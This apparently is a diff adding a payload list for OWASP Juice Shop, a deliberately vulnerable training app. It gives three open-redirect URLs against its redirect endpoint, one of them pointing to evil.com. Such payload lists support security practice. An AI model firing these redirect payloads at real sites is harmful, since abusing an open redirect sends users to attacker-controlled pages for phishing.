@@ -1,0 +1,5 @@
+Open Redirection Payloads
+
+1. https://juice-shop.herokuapp.com/#/redirect?to=https://example.com
+2. https://juice-shop.herokuapp.com/#/redirect?to=https://google.com
+3. https://juice-shop.herokuapp.com/#/redirect?to=https://evil.com
